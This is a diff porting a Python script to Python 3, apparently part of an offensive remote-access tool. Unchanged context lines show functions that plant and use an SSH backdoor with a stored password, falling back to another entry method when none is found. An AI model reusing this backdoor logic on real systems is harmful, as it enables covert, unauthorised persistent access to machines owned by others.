@@ -9,7 +9,8 @@ import shutil
 import os
 import threading
 import datetime
-from app.util import fileutil,webutil
+import app.util.fileutil
+import app.util.webutil
 
 DEBUG=True
 
@@ -34,7 +35,7 @@ def debug(msg):
 		print(msg)
 
 def error(msg):
-	print msg
+	print(msg)
 
 ####process####
 def spawn(cmd, ready_phrase = "<<ACTION COMPLETE>>"):
@@ -69,7 +70,7 @@ def send_sync(proc, msg, timeout = RESPONSE_TIMEOUT_MED, expect_prompt="#"):
 	expect(proc, expect_prompt, timeout=timeout)
 
 	buf = proc.before
-	print buf
+	print(buf)
 
 	return buf
 	#return proc.read()
@@ -93,12 +94,12 @@ def addBackdoor(proc):
 	check(proc)
 
 def useBackdoor(host):
-	print "Looking for backdoor..."
+	print("Looking for backdoor...")
 	proc = spawn("ssh {0}".format(host),"password")
 	try:
 		send(proc, BACKDOOR_PASS)
 		expect(proc, "Last login")
-		print "found"
+		print("found")
 	except:
 		pass
 	return proc
@@ -111,16 +112,16 @@ def checkConnection(proc, timeout=RESPONSE_TIMEOUT_MED):
 		send(proc, "echo " + ECHO_REQUEST)
 		expect(proc, ECHO_RESPONSE, timeout=timeout)
 		return True
-	except Exception, e:
+	except Exception as e:
 		debug("BAD CONNECTION")
-		print e
+		print(e)
 		return False
 
 def connect_interactive(host):
 	interact(connect(host))
 
 def connect(host):
-	print "CONNECTING to {0}...".format(host)
+	print("CONNECTING to {0}...".format(host))
 	p = useBackdoor(host)
 	if(not checkConnection(p)):
 		debug("no backdoor, going in the front")
